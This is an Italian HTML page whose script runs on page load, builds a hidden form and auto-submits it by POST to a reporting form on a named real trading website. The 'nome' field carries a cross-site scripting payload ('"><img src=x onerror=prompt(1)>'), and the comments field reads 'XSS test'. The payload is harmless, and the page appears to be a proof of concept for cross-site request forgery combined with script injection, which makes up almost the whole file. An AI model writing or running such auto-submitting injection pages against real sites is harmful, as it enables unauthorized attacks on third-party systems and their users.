<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Precompila Form Traderlink</title>
</head>
<body>
    <script>
        function compilaForm() {
            // Creiamo un form dinamico che invia i dati al sito desiderato
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://www.traderlink.it/segnalazioni';  // URL del form

            // Creiamo i campi con i dati precompilati
            var nome = document.createElement('input');
            nome.type = 'hidden';
            nome.name = 'nome';  // Sostituisci 'nome' con il valore corretto dal sito
            nome.value = '"><img src=x onerror=prompt(1)>'; 
            form.appendChild(nome);

            var cognome = document.createElement('input');
            cognome.type = 'hidden';
            cognome.name = 'cognome';  // Sostituisci 'cognome' con il valore corretto dal sito
            cognome.value = 'pluto';
            form.appendChild(cognome);

            // Aggiungi il campo commenti
            var commenti = document.createElement('input');
            commenti.type = 'hidden';
            commenti.name = 'commenti';  // Sostituisci 'commenti' con il valore corretto dal sito
            commenti.value = 'XSS test';
            form.appendChild(commenti);

            // Aggiungi il form al body e invialo
            document.body.appendChild(form);
            form.submit();
        }

        // Esegui la funzione automaticamente quando la pagina viene caricata
        window.onload = compilaForm;
    </script>
</body>
</html>
